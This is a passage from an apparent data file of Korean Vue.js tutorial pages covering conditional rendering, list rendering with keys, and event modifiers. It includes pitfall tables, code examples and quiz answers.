        body: "탭 셋을 <FormA v-if=\"tab === 'a'\"/><FormB v-else-if=\"tab === 'b'\"/>로 바꿉니다. 사용자가 A에 입력하고 B를 보고 돌아오면 A가 비어 있습니다. v-if는 조건이 거짓이 되면 컴포넌트를 언마운트합니다. state가 사라지고 unmounted 훅이 돕니다(실제로 확인). 처방은 셋입니다. 자주 오가고 입력 상태가 중요하면 v-show로 숨기기만 합니다. 요소는 DOM에 남고 display만 토글되니 state가 삽니다. 컴포넌트가 무거워 DOM에 늘 두기 싫으면 <KeepAlive>로 감싸 언마운트 대신 캐시합니다(내장 컴포넌트 노드. 실제로 돌려 보면 돌아왔을 때 A:1이 유지됐습니다). 또는 입력 상태를 부모나 스토어로 올려 컴포넌트가 사라져도 남게 합니다. 문서의 기준은 '자주 토글하면 v-show, 조건이 런타임에 잘 안 바뀌면 v-if'입니다.",
      },
      {
        label: "문제가 나는 경우: 없애기와 숨기기를 혼동할 때",
        body: "경우 ㄱ, v-if로 폼 탭입니다. 위의 사고입니다. 경우 ㄴ, v-else가 바로 다음 형제가 아닙니다. 사이에 요소가 끼면 인식되지 않습니다. 경우 ㄷ, v-show에 <template>. 지원 안 함. v-if 또는 요소에 직접. 경우 ㄹ, v-show에 v-else. 안 됨. v-if 체인으로. 경우 ㅁ, v-if + v-for 한 요소. v-if가 먼저라 v-for 변수를 못 읽음. computed로 걸러서 v-for, 또는 <template v-for> 안에 v-if. 경우 ㅂ, v-if/v-else 분기에 같은 key. 컴파일 에러(실제로). 다른 key 또는 생략. 경우 ㅅ, v-if/v-else로 같은 태그를 바꾸는데 input 값이 남습니다. 같은 자리의 같은 태그는 재사용됩니다. 다른 key로 강제 교체. 경우 ㅇ, 무거운 컴포넌트를 v-show로 늘 둠. 초기 렌더 비용이 들고 숨겨도 갱신됩니다. v-if. 경우 ㅈ, v-show에 초기 display: flex를 기대. 초기 display 값은 존중되지만 none에서 돌아올 때 복원값은 원래 인라인 값. CSS 클래스로. 경우 ㅊ, v-if 안의 컴포넌트가 사라질 때 타이머를 안 정리. unmounted에서 정리. 경우 ㅋ, v-if=\"list.length\" 대신 v-if=\"list\"로 빈 배열 검사. 빈 배열은 truthy. .length. 경우 ㅌ, v-if로 Transition 없이 애니메이션 기대. 제거는 즉시. <Transition>.",
        code: "경우               언제 생기나                        겉모습                                      처방\nㄱ v-if 탭          입력 폼 전환                        입력 사라짐 · unmounted (실제로)               v-show · KeepAlive · 상태 올리기\nㄴ v-else 떨어짐     중간에 다른 요소                     인식 안 됨                                  바로 다음 형제\nㄷ template v-show   <template v-show>                  미지원                                     v-if · 요소에\nㄹ v-show + v-else   혼합                               안 됨                                      v-if 체인\nㅁ v-if + v-for      같은 요소                           v-for 변수 못 읽음                           computed · template v-for\nㅂ 같은 key 분기     v-if/v-else key=\"k\"                 v-if/else branches must use unique keys.     다른 key\nㅅ 같은 태그 재사용   v-if/v-else <input>                  값이 남음                                   key 로 교체\nㅇ 무거운 v-show     늘 렌더                             초기 비용 · 숨겨도 갱신                        v-if\nㅈ display 복원      초기 flex 기대                      인라인 값 기준                               CSS 클래스\nㅊ 정리 누락        v-if 로 제거되는 타이머               누수                                       unmounted 정리\nㅋ 빈 배열 truthy    v-if=\"list\"                         늘 참                                      list.length\nㅌ 애니메이션 기대    v-if 토글                           즉시 제거                                   <Transition>",
        codeLang: "text",
      },
      {
        label: "문제의 구조: v-if 는 '존재' 를, v-show 는 '가시성' 을 바꾼다",
        body: "둘은 같은 '보이지 않게'를 다른 층에서 합니다. v-if는 가상 DOM 트리에서 노드를 빼고 넣습니다. 그래서 컴포넌트 수명(mount·unmount)과 state가 함께 사라지고(ㄱ, ㅊ), 분기는 트리의 같은 자리를 다른 노드가 차지하는 것이라 key로 정체를 가르고(ㅂ, ㅅ), v-for보다 먼저 평가되어 변수를 못 읽습니다(ㅁ). v-show는 트리는 그대로 두고 CSS display만 바꿉니다. 그래서 state가 남고, 늘 렌더되며(ㅇ), 요소가 있어야 하니 <template>·v-else가 안 됩니다(ㄷ, ㄹ). 처방은 '이 컴포넌트의 수명과 state를 조건에 묶을 것인가'를 묻는 것입니다. 묶으면 v-if, 안 묶고 자주 오가면 v-show, 안 묶되 DOM에서는 빼고 싶으면 KeepAlive.",
        code: "v-if    가상 DOM 트리에서 빼고 넣음  → 수명·state 함께 (ㄱ ㅊ) · 같은 자리 = key 로 정체 (ㅂ ㅅ) · v-for 보다 먼저 (ㅁ) · 지연\nv-show  트리 그대로 · display 만     → state 유지 · 늘 렌더 (ㅇ) · 요소 필요 → template·v-else 불가 (ㄷ ㄹ)\nKeepAlive  트리에서 빼되 인스턴스 캐시 → state 유지 + DOM 제거\n\n묻기: 수명·state 를 조건에 묶나? → 예 v-if / 아니오·자주 v-show / 아니오·DOM 제거 KeepAlive",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "다음 페이지 '리스트 렌더링'은 v-for와 key입니다. 실제로 돌려 보면 key를 바꾸면 <input>의 값이 초기값으로 돌아갔고, 컴파일 출력의 v-for는 KEYED_FRAGMENT(128) 플래그였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 모달을 열고 닫습니다. 안에 비디오 플레이어(서드파티, 초기화 비쌈)가 있습니다. v-if와 v-show 중? (2) 로그인·회원가입 폼을 v-if/v-else로 바꾸는데 둘 다 <input type=\"email\">이 첫 칸이라 입력값이 넘어옵니다. 왜고 어떻게? (3) 목록에서 완료되지 않은 항목만 보이려 <li v-for=\"t in todos\" v-if=\"!t.done\">를 썼습니다. 무엇이 문제인가요?",
        notes: [
          {
            title: "답",
            body: "(1) 모달은 자주 열고 닫히고 플레이어 초기화가 비싸니 v-show가 맞습니다. 요소가 DOM에 남아 재초기화하지 않고 state(재생 위치)가 유지됩니다. 단 숨겨진 동안에도 렌더·갱신되고 소리가 날 수 있으니 닫을 때 pause를 부릅니다. 메모리가 부담이면 v-if + KeepAlive는 아니고(KeepAlive는 컴포넌트용) 그냥 v-if로 바꾸되 초기화 비용을 받아들입니다. (2) v-if/v-else의 두 분기가 같은 자리에 같은 태그 구조를 두면 Vue는 요소를 재사용하고 속성만 패치합니다. <input>의 DOM 값은 Vue가 관리하지 않으니 남습니다. 각 폼 루트에 다른 key(key=\"login\" / key=\"signup\")를 주면 교체되어 새 요소가 됩니다. 실제로 돌려 보면 key를 바꾸자 input 값이 초기값으로 돌아갔습니다. (3) 같은 요소의 v-if는 v-for보다 먼저 평가되어 t를 읽을 수 없습니다(문서: 'property \"todo\" is not defined' 에러). 3.5.45 컴파일러는 경고 없이 통과시켜 런타임에 터집니다. const active = computed(() => todos.value.filter(t => !t.done))으로 미리 걸러 v-for=\"t in active\"로 쓰거나, <template v-for=\"t in todos\" :key=\"t.id\"><li v-if=\"!t.done\">로 감쌉니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Conditional Rendering", href: `${DOCS}/guide/essentials/conditional` },
      { label: "v-if · v-show (Built-in Directives)", href: `${DOCS}/api/built-in-directives#v-if` },
      { label: "KeepAlive", href: `${DOCS}/guide/built-ins/keep-alive` },
    ],
  },

  {
    id: "vg-ess-list",
    name: "리스트 렌더링",
    tagline: "v-for 와 key: 배열을 요소로, 그리고 어느 요소가 어느 항목인지",
    intro:
      "필수 개념 일곱째 페이지입니다. v-for=\"item in items\"로 배열·객체·숫자 범위·이터러블을 요소로 펼칩니다. (item, index), (value, key, index), 구조 분해, of 구분자, <template v-for>. 규칙 셋이 핵심입니다. key는 '정체'라 가능하면 늘 주되 원시값(문자열·숫자)이어야 하고 객체는 안 됨. 같은 요소에 v-if를 두면 v-if가 먼저 평가되어 v-for 변수를 못 읽음. 배열은 변이 메서드(push·pop·shift·unshift·splice·sort·reverse)가 추적되고 비변이 메서드(filter·concat·slice)는 새 배열로 교체해야 하며, computed 안의 reverse()·sort()는 원본을 바꾸니 복사 뒤에. 실제로 돌려 보면 key를 바꾸자 <input> 값이 초기값으로 돌아갔고(새 요소), 컴파일 출력의 keyed v-for는 128 /* KEYED_FRAGMENT */ 블록이었으며, computed 안의 arr.sort()가 reactive 원본을 정렬해 버렸습니다. 이 노드의 질문은 하나입니다. Vue는 어느 요소가 어느 항목인지 어떻게 아나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<li v-for=\"item in items\">{{ item.message }}</li>. 둘째 별칭은 인덱스 (item, index). 구조 분해 ({ message } in items). of도 됨(item of items). 객체는 (value, key, index) in object로 Object.values 순서. 숫자 n in 10은 1부터 10. <template v-for>로 여러 요소를 한 항목에. key: <li v-for=\"item in items\" :key=\"item.id\">. 기본(key 없음)은 '제자리 패치'로 순서가 바뀌어도 요소를 옮기지 않고 내용만 고치므로 자식 컴포넌트 상태나 임시 DOM 상태(input 값)가 있는 리스트에는 맞지 않습니다. 'key는 원시값(문자열·숫자)이어야 하고 객체는 안 됨'. 컴포넌트에 v-for를 쓰면 key 필수이고 데이터는 props로 명시해 넘깁니다(자동 주입 없음). 배열 변화 감지: push·pop·shift·unshift·splice·sort·reverse는 변이라 추적됨. filter·concat·slice는 새 배열을 돌려주니 items.value = items.value.filter(…)로 교체. 교체해도 Vue는 DOM을 통째로 버리지 않고 재사용합니다. 필터·정렬 뷰는 computed로. 'computed 안의 reverse()·sort()는 원본을 바꾸니 주의'. [...numbers].reverse(). v-if와 v-for: 'v-if가 v-for보다 우선순위가 높아 v-for 변수를 못 읽는다'. computed로 걸러서, 또는 <template v-for> 안에 v-if.",
        code: "<li v-for=\"(item, index) in items\" :key=\"item.id\">{{ index }} - {{ item.message }}</li>\n<li v-for=\"({ message }, index) in items\" :key=\"index\">{{ message }}</li>\n<li v-for=\"(value, key, index) in myObject\" :key=\"key\">{{ index }}. {{ key }}: {{ value }}</li>\n<span v-for=\"n in 10\" :key=\"n\">{{ n }}</span>            <!-- 1..10 -->\n<template v-for=\"item in items\" :key=\"item.id\">           <!-- key 는 template 에 -->\n  <li>{{ item.msg }}</li><li class=\"divider\" role=\"presentation\"></li>\n</template>\n\n<!-- 컴포넌트 — key 필수 · props 명시 -->\n<MyComponent v-for=\"(item, index) in items\" :item=\"item\" :index=\"index\" :key=\"item.id\" />\n\n// 배열 변화\nitems.value.push(x)                             // 변이 → 추적\nitems.value = items.value.filter(i => i.ok)     // 비변이 → 교체\nconst evens = computed(() => numbers.value.filter(n => n % 2 === 0))\nconst reversed = computed(() => [...numbers.value].reverse())   // 복사 뒤 — 원본 보호",
        terms: [
          {
            term: "key",
            body: "v-for가 만든 각 노드에 '이 노드는 이 항목이다'를 알려 주는 원시값입니다. 목록이 바뀌면 Vue는 key로 옛 노드와 새 항목을 짝지어 재사용·이동·제거를 정합니다. 없으면 자리 순서로 짝짓는 '제자리 패치'라 항목이 끼거나 빠지면 뒤의 노드들이 다른 항목을 그리게 되어 input 값이나 자식 state가 옆 항목으로 샙니다. index를 key로 쓰면 없는 것과 같습니다. 같은 key가 형제에 둘 있으면 렌더 에러입니다. key를 바꾸면 새 노드가 됩니다(실제로 input 값 리셋).",
          },
          {
            term: "변이 메서드 (mutating methods)",
            body: "배열 자체를 바꾸는 메서드입니다. push, pop, shift, unshift, splice, sort, reverse. reactive 배열에서 부르면 추적되어 갱신이 일어납니다. filter, concat, slice, map은 새 배열을 돌려주고 원본은 그대로라 결과를 다시 대입해야 합니다. sort·reverse가 변이라는 점이 computed 안에서 사고를 만듭니다(실제로 원본이 정렬됨). toSorted·toReversed는 비변이 버전입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 <input :key=\"k\" value=\"초기\">에 사용자가 '사용자입력'을 치게 한 뒤 k를 1에서 2로 바꾸니 input의 value가 '초기'로 돌아왔습니다. key가 바뀌면 같은 자리라도 새 요소입니다. 반대로 v-if/v-else 분기에서 같은 태그를 key 없이 바꾸면 요소가 재사용되어 값이 남습니다(조건부 렌더링 노드). Node의 컴파일러에서 <ul><li v-for=\"i in items\" :key=\"i\">{{ i }}</li></ul>은 (_openBlock(true), _createElementBlock(_Fragment, null, _renderList(_ctx.items, (i) => (_openBlock(), _createElementBlock(\"li\", { key: i }, _toDisplayString(i), 1 /* TEXT */))), 128 /* KEYED_FRAGMENT */))로, key가 있는 조각이라는 플래그와 각 항목의 TEXT 플래그가 붙었습니다. reactive([3, 1, 2])를 computed 안에서 arr.sort()하니 원본이 [1, 2, 3]이 됐습니다. 배열 인덱스 대입 list[0] = 9, list.length = 1, push(5)가 전부 추적되어 효과가 묶여 한 번 돌았고 결과는 [9, 5]. Map·Set도 reactive로 추적됩니다. 같은 요소의 v-for + v-if는 3.5.45 컴파일러가 경고 없이 통과했습니다(문서는 런타임에 변수를 못 읽는다고 적음).",
        code: "// Chrome 156\n<input :key=\"k\" value=\"초기\">  사용자 '사용자입력' → k: 1 → 2 → value '초기'   (새 요소)\n\n// Node — 컴파일 출력\n<li v-for=\"i in items\" :key=\"i\">{{ i }}</li>\n→ (_openBlock(true), _createElementBlock(_Fragment, null, _renderList(_ctx.items, (i) => {\n     return (_openBlock(), _createElementBlock(\"li\", { key: i }, _toDisplayString(i), 1 /* TEXT */))\n   }), 128 /* KEYED_FRAGMENT */))\n\n// 변이\ncomputed(() => arr.sort()).value → reactive 원본 [1, 2, 3] 으로 정렬됨\nlist[0] = 9; list.length = 1; list.push(5) → 효과 1회 (묶음) · [9, 5]\n<li v-for=\"i in list\" v-if=\"i.ok\"> → 컴파일 통과 (경고 없음) · 문서: 런타임에 i 를 못 읽음",
      },
      {
        label: "문제: 항목을 삭제하자 다른 행의 체크박스가 체크된다",
        body: "<tr v-for=\"(row, i) in rows\" :key=\"i\">에 각 행마다 <input type=\"checkbox\">(v-model 없이)와 자식 컴포넌트가 있습니다. 두 번째 행을 지우자 세 번째 행이 두 번째 자리로 오면서 체크 상태가 지운 행의 것으로 보입니다. index를 key로 쓰면 key가 없는 것과 같습니다. 자리 순서로 짝지으니 2번 자리의 DOM(체크됨)이 그대로 남고 내용만 세 번째 항목으로 바뀝니다. 실제로 돌려 보면 key가 바뀔 때만 요소가 새로 만들어졩습니다. 처방은 항목 고유의 원시값(row.id)을 key로 쓰는 것입니다. 그러면 지운 행의 DOM이 제거되고 나머지는 자기 항목을 따라 이동합니다. 문서의 '가능하면 늘 key', '객체는 key로 쓰지 말 것'이 여기 있습니다. 체크 상태를 DOM이 아니라 데이터(row.checked + v-model)에 두면 key가 틀려도 내용은 맞게 그려집니다. 그래도 자식 컴포넌트 state와 Transition은 key가 맞아야 합니다.",
      },
      {
        label: "문제가 나는 경우: 정체와 변이를 모를 때",
        body: "경우 ㄱ, index key입니다. 위의 사고입니다. 경우 ㄴ, key 없음. 제자리 패치. 자식 state·input 값이 샘. 경우 ㄷ, 객체 key(:key=\"item\"). 문서가 금지. 원시값. 경우 ㄹ, 중복 key. 렌더 에러. 고유값. 경우 ㅁ, 같은 요소 v-if + v-for. 변수 못 읽음. computed·template. 경우 ㅂ, filter 결과를 대입 안 함. 원본 그대로. 교체. 경우 ㅅ, computed 안 sort·reverse. 원본 변경(실제로). 복사·toSorted. 경우 ㅇ, 컴포넌트 v-for에 데이터가 자동으로 들어갈 거라 기대. props로 명시. 경우 ㅈ, <template v-for>의 key를 안쪽 요소에. template에. 경우 ㅊ, 숫자 범위가 0부터일 거라 기대. 1부터. 경우 ㅋ, 객체 순회 순서를 믿음. Object.values 순서(정수 키 먼저)라 엔진 규칙. 배열로. 경우 ㅌ, 큰 리스트를 전부 렌더. 가상 스크롤(성능 페이지). 경우 ㅍ, v-for 안에서 매번 새 객체 props를 만들어 자식이 전부 리렌더. 안정된 props·v-memo(성능 페이지).",
        code: "경우               언제 생기나                          겉모음                                   처방\nㄱ index key        :key=\"i\"                            삭제 뒤 상태가 옆 행으로                    item.id\nㄴ key 없음         v-for 만                             제자리 패치 · 상태 샘                      key\nㄷ 객체 key         :key=\"item\"                          비권장 · 비교 비용                         원시값\nㄹ 중복 key         같은 id 둘                            렌더 에러                                고유값\nㅁ v-if 같은 요소    v-for + v-if                         변수 못 읽음 (런타임)                      computed · <template v-for>\nㅂ 비변이 미대입     items.filter(…) 만                   변화 없음                                items = items.filter\nㅅ computed 변이     sort()/reverse()                     원본 바뀜 (실제로)                        [...a].sort() · toSorted\nㅇ 자동 주입 기대    <Comp v-for>                         props 없음                               :item=\"item\"\nㅈ key 위치         template 안쪽에                       경고                                     <template :key>\nㅊ 범위 0 기대      n in 10                             1..10                                   n - 1\nㅋ 객체 순서        v-for in obj                         정수 키 먼저                              배열\nㅌ 거대 리스트       10,000 행                            느림                                    가상 스크롤\nㅍ 불안정 props     :cfg=\"{ … }\" in v-for                전부 리렌더                               안정 props · v-memo",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 리스트는 '항목 → 노드' 의 짝이고, key 가 그 짝을 정한다",
        body: "v-for는 항목 배열을 노드 배열로 바꿉니다. 배열이 바뀌면 Vue는 옛 노드와 새 항목을 다시 짝지어야 하는데, 그 기준이 key입니다. key가 없거나 index면 '자리'가 기준이라 끼움·삭제에서 짝이 어긋나 DOM·state가 옆으로 새고(ㄱ, ㄴ), 객체 key는 비교가 비싸며(ㄷ), 중복이면 짝이 둘이라 에러입니다(ㄹ). 항목 배열이 '바뀌었다'를 Vue가 아는 길은 변이 메서드의 추적이거나 배열 교체이고(ㅂ), 변이가 뷰 계산(computed) 안에서 일어나면 원본이 다칩니다(ㅅ). v-if가 v-for보다 먼저인 것은 '항목이 아직 없는 시점에 조건을 보는' 것이라 변수를 못 읽습니다(ㅁ). 처방은 항목마다 고유 원시 id를 두고(key), 뷰 계산은 복사 위에서 하고, 거르기는 computed로 먼저 하는 것입니다.",
        code: "항목 배열 ──v-for──▶ 노드 배열\n바뀌면: 옛 노드 ↔ 새 항목 짝짓기 — 기준 = key\n  key 없음/index → 자리 기준 → 끼움·삭제에 어긋남 (ㄱ ㄴ) · 객체 key 비쌈 (ㄷ) · 중복 = 짝 둘 (ㄹ)\n'바뀌었다' 를 아는 길: 변이 메서드 추적 · 배열 교체 (ㅂ) — 뷰 계산 안 변이는 원본 손상 (ㅅ)\nv-if 는 항목 전 시점 → 변수 없음 (ㅁ) → computed 로 먼저 거르기",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "화면에서 값으로 돌아오는 첫 길이 다음 페이지 '이벤트 처리'입니다. 실제로 돌려 보면 .prevent.self와 .self.prevent는 자식 클릭에서 다르게 동작했고, .once는 한 번, .exact는 수식어 조합을 정확히 가렸습니다.",
      },
      {
        label: "확인 질문",
        body: "할 일 목록입니다. (1) 완료 항목을 숨기는 필터와 마감일 정렬을 어떻게? (2) 각 항목 컴포넌트 <TodoItem>이 편집 중 state를 가집니다. key는? (3) 항목을 드래그로 재정렬할 때 Transition이 어색합니다. 무엇을 확인할까요?",
        notes: [
          {
            title: "답",
            body: "(1) 둘 다 computed입니다. const visible = computed(() => (hideDone.value ? todos.value.filter(t => !t.done) : todos.value)); const sorted = computed(() => [...visible.value].sort((a, b) => a.due - b.due)). filter는 새 배열이지만 sort는 제자리라 복사 뒤 정렬합니다(실제로 computed 안 sort가 원본을 바꿨습니다). 템플릿은 v-for=\"t in sorted\" :key=\"t.id\". 같은 요소에 v-if로 거르지 않습니다. (2) 항목 고유 원시 id입니다(:key=\"t.id\"). index를 쓰면 삭제·정렬에서 편집 중 state가 옆 항목으로 샙니다. 실제로 돌려 보면 key가 바뀔 때만 새 요소가 됐습니다. 데이터는 :todo=\"t\"로 명시해 넘깁니다. (3) key가 고유 id인지(index면 이동이 아니라 내용 교체로 보여 move 애니메이션이 안 됨), 목록을 <TransitionGroup tag=\"ul\">로 감쌌는지, 재정렬이 배열 변이(splice)나 교체로 Vue에 보이는지. 실제로 돌려 보면 TransitionGroup은 key가 바뀐 항목 순서에 list-move 클래스를 붙였습니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "List Rendering", href: `${DOCS}/guide/essentials/list` },
      { label: "key (Special Attributes)", href: `${DOCS}/api/built-in-special-attributes#key` },
      { label: "Style Guide — Keyed v-for", href: `${DOCS}/style-guide/rules-essential#use-keyed-v-for` },
    ],
  },

  {
    id: "vg-ess-events",
    name: "이벤트 처리",
    tagline: "@click 과 수식어: 수식어는 적은 순서대로 코드가 된다",
    intro:
      "필수 개념 여덟째 페이지입니다. v-on(@)으로 DOM 이벤트를 듣습니다. 핸들러는 인라인(count++)이거나 메서드(greet)이고, 인라인에서 네이티브 이벤트는 $event 또는 화살표 함수의 인자. 수식어: .stop, .prevent, .self, .capture, .once, .passive. '수식어는 순서가 중요하다. 같은 순서로 코드가 생성되기 때문'. @click.prevent.self는 요소와 자식 전부의 기본 동작을 막고, @click.self.prevent는 요소 자신의 클릭만 막습니다. 키 수식어 .enter .tab .delete .esc .space .up .down .left .right와 KeyboardEvent.key의 kebab-case(.page-down). 시스템 수식어 .ctrl .alt .shift .meta, .exact(정확한 조합), 마우스 .left .right .middle. '.passive와 .prevent를 함께 쓰지 말 것'. 실제로 돌려 보면 .prevent.self 부모의 자식 링크 클릭은 preventDefault가 됐고(핸들러는 안 돎), .self.prevent 부모의 자식 클릭은 preventDefault가 안 됐으며, .once는 두 번 눌러도 한 번, .exact는 ctrl+shift에 아무것도 안 울렸고, @keyup.page-down이 PageDown에 울렸습니다. 이 노드의 질문은 하나입니다. 수식어는 무엇을 어느 순서로 하나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<button @click=\"count++\">(인라인 문장), <button @click=\"greet\">(메서드. foo, foo.bar, foo['bar'] 꼴은 메서드 참조, foo()·count++은 인라인). 메서드 핸들러는 네이티브 이벤트를 첫 인자로 받습니다. 인라인에서 이벤트가 필요하면 $event나 (event) => warn('x', event). 이벤트 수식어: .stop(stopPropagation), .prevent(preventDefault), .self(event.target이 요소 자신일 때만), .capture(캡처 단계), .once(한 번), .passive(기본 동작을 막지 않겠다는 약속, 스크롤 성능). 순서: '관련 코드가 같은 순서로 생성되므로 순서가 중요'. 키 수식어: @keyup.enter, @keyup.page-down(KeyboardEvent.key를 kebab-case로), 별칭 .enter .tab .delete(Delete와 Backspace) .esc .space .up .down .left .right. 시스템: .ctrl .alt .shift .meta. keyup과 함께 쓰면 키를 놓는 순간 수식어 키가 눌려 있어야 합니다. .exact: 정확히 그 조합일 때만(@click.ctrl.exact는 ctrl만, @click.exact는 아무 수식어 없이). 마우스 버튼: .left .right .middle(물리 버튼이 아니라 주·보조·보조 트리거). 컴포넌트에서는 @custom-event가 emit을 듣습니다(컴포넌트 이벤트 노드).",
        code: "<button @click=\"count++\">Add 1</button>                      <!-- 인라인 -->\n<button @click=\"greet\">Greet</button>                        <!-- 메서드 (event 를 첫 인자로) -->\n<button @click=\"say('hi', $event)\">Say</button>                <!-- 인라인 + 이벤트 -->\n<button @click=\"(event) => warn('x', event)\">Warn</button>\n\n<!-- 수식어 — 순서대로 -->\n<form @submit.prevent=\"onSubmit\"></form>\n<a @click.stop.prevent=\"doThat\"></a>\n<div @click.prevent.self=\"doThat\">…</div>   <!-- 요소+자식 클릭 전부 preventDefault · 핸들러는 자신일 때만 -->\n<div @click.self.prevent=\"doThat\">…</div>   <!-- 자신일 때만 preventDefault + 핸들러 -->\n<div @scroll.passive=\"onScroll\">…</div>     <!-- .prevent 와 함께 X -->\n\n<!-- 키 · 시스템 · exact · 마우스 -->\n<input @keyup.enter=\"submit\" @keyup.page-down=\"onPageDown\" />\n<input @keyup.alt.enter=\"clear\" />          <!-- keyup: 놓을 때 alt 가 눌려 있어야 -->\n<button @click.ctrl.exact=\"onCtrlClick\" @click.exact=\"onClick\">   <!-- ctrl 만 / 아무 수식어 없이 -->\n<div @click.right.prevent=\"menu\">",
        terms: [
          {
            term: "수식어 순서 (modifier order)",
            body: "수식어는 적은 순서대로 핸들러를 감싸는 코드가 됩니다. .prevent.self는 '먼저 preventDefault, 그다음 자신인지 검사해 핸들러'라 자식 클릭에도 기본 동작이 막히고, .self.prevent는 '먼저 자신인지 검사, 통과하면 preventDefault와 핸들러'라 자식 클릭은 그냥 통과합니다. 실제로 돌려 보면 그대로였습니다. 문서: 'Order matters when using modifiers because the relevant code is generated in the same order.'",
          },
          {
            term: ".passive",
            body: "addEventListener의 { passive: true }입니다. '이 리스너는 preventDefault를 부르지 않겠다'는 약속이라 브라우저가 리스너를 기다리지 않고 스크롤을 진행합니다(모바일 터치·스크롤 성능). .prevent와 함께 쓰면 약속을 어기는 것이라 브라우저가 경고하고 prevent는 무시됩니다. 문서: 'Do not use .passive and .prevent together'. JavaScript 노드 16장의 기본 동작 항목이 이 자리입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 <div @click.prevent.self> 안의 <a href=\"#x\">를 클릭하니 이벤트의 defaultPrevented가 true(막힘)였고 핸들러는 돌지 않았습니다(자식이라 .self 탈락). <div @click.self.prevent> 안의 <a>를 클릭하니 defaultPrevented가 false, 핸들러도 안 돌았습니다. .self가 먼저 걸러 prevent까지 가지 않습니다. @click.once 버튼을 두 번 누르니 로그는 ['once'] 하나. @click.ctrl.exact와 @click.exact를 같이 둔 버튼은 보통 클릭에 'exact', ctrl 클릭에 'ctrl.exact', ctrl+shift 클릭에는 아무것도 안 울렸습니다. <input @keyup.enter @keyup.page-down>은 Enter에 'enter', PageDown에 'page-down', 'a'에는 없음. 수식어 순서가 코드 순서라는 것이 .prevent.self vs .self.prevent에서 그대로 보였습니다. 컴파일 출력에서 핸들러는 _cache[n] || (_cache[n] = $event => …)로 캐시됩니다(cacheHandlers). emits에 click을 선언한 컴포넌트에 @click을 걸면 네이티브 click은 안 오고 emit만 왔고, 선언 없는 컴포넌트는 네이티브 click이 루트로 폴스루됐습니다(컴포넌트 이벤트 노드).",
        code: "// Chrome 156\n<div @click.prevent.self> 안의 <a> 클릭 → defaultPrevented true · 핸들러 안 돎   (prevent 먼저, self 탈락)\n<div @click.self.prevent> 안의 <a> 클릭 → defaultPrevented false · 핸들러 안 돎  (self 먼저 탈락 → prevent 안 함)\n@click.once ×2                          → ['once']\n@click.ctrl.exact + @click.exact         → 클릭 'exact' · ctrl 'ctrl.exact' · ctrl+shift (없음)\n@keyup.enter · @keyup.page-down          → Enter 'enter' · PageDown 'page-down' · 'a' (없음)\n\n// 컴파일 출력 — 핸들러 캐시\n\"onUpdate:modelValue\": _cache[0] || (_cache[0] = $event => ((_ctx.v) = $event))",
      },
      {
        label: "문제: 모달 바깥을 눌러 닫기가 모달 안 클릭에도 닫힌다",
        body: "<div class=\"overlay\" @click=\"close\"><div class=\"modal\">…</div></div>. 모달 안을 눌러도 click이 overlay로 버블링해 close가 돕니다. 처방은 @click.self=\"close\"입니다. event.target이 overlay 자신일 때만 핸들러가 돌아 모달 안 클릭은 통과합니다. 실제로 돌려 보면 .self 부모는 자식 클릭에 핸들러를 돌리지 않았습니다. 모달 안에서 stopPropagation을 쓰는 방법(@click.stop)도 되지만, 그러면 모달 안의 다른 위임 리스너(document 레벨 분석 등)도 끊기므로 .self가 덜 침습적입니다. overlay의 기본 동작(예: 안의 링크)까지 막아야 하면 순서를 생각합니다. @click.self.prevent는 자신일 때만 막고, @click.prevent.self는 자식 링크까지 막습니다.",
      },
      {
        label: "문제가 나는 경우: 수식어의 뜻과 순서를 모를 때",
        body: "경우 ㄱ, 버블링된 클릭입니다. 위의 사고입니다. 경우 ㄴ, .prevent.self와 .self.prevent 혼동. 자식 링크가 막히거나 안 막힘(실제로). 순서. 경우 ㄷ, .passive + .prevent. 브라우저 경고, prevent 무시. 하나만. 경우 ㄹ, @keyup.ctrl.enter에서 ctrl을 먼저 놓음. keyup 시점에 ctrl이 눌려 있어야. keydown으로. 경우 ㅁ, .exact 없이 @click.ctrl이 ctrl+shift에도 울림. .exact. 경우 ㅂ, 인라인 핸들러에서 event를 쓰려는데 없음. $event 또는 화살표 인자. 경우 ㅅ, 메서드 참조에 괄호를 붙임(@click=\"greet()\"). 인라인이 되어 event가 안 넘어옴(인자 없이 호출). greet 또는 greet($event). 경우 ㅇ, .delete가 Backspace도 잡는 걸 모름. 둘 다. 경우 ㅈ, 컴포넌트에 @click이 안 울림. 자식이 emits에 click을 선언했으면 네이티브는 안 옴(실제로). emit 또는 선언 제거. 경우 ㅊ, @click.right에 컨텍스트 메뉴가 뜸. .prevent 추가. 경우 ㅋ, 수식어를 객체 문법 v-on=\"{ click: fn }\"에 기대. 객체 문법은 수식어 미지원. 경우 ㅌ, 핸들러 안에서 상태를 바꾸고 바로 DOM을 읽음. 다음 틱. nextTick.",
        code: "경우               언제 생기나                       겉모습                               처방\nㄱ 버블링 클릭       overlay @click                     안을 눌러도 닫힘                       @click.self\nㄴ 순서 혼동        .prevent.self ↔ .self.prevent      자식 링크 막힘/안 막힘 (실제로)           순서대로 읽기\nㄷ passive+prevent   @scroll.passive.prevent            브라우저 경고 · 무시                    하나만\nㄹ keyup 시스템키    @keyup.ctrl.enter                  ctrl 먼저 놓으면 안 울림                 keydown\nㅁ exact 없음       @click.ctrl                        ctrl+shift 에도                       .exact\nㅂ event 없음       인라인 fn('x')                     undefined                            $event · (e) =>\nㅅ 괄호 메서드       @click=\"greet()\"                   event 안 옴                          greet · greet($event)\nㅇ delete 범위       .delete                            Backspace 도                          -\nㅈ 컴포넌트 click    emits: ['click'] 자식               네이티브 안 옴 (실제로)                  emit · 선언 제거\nㅊ right 메뉴        @click.right                       컨텍스트 메뉴                         .prevent\nㅋ 객체 문법 수식어   v-on=\"{ click }\"                   수식어 불가                           개별 @\nㅌ 바로 DOM 읽기     핸들러에서 set 뒤 read              옛 값                                nextTick",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 수식어는 핸들러를 감싸는 '검사·행동의 사슬' 이고, 사슬은 적은 순서다",
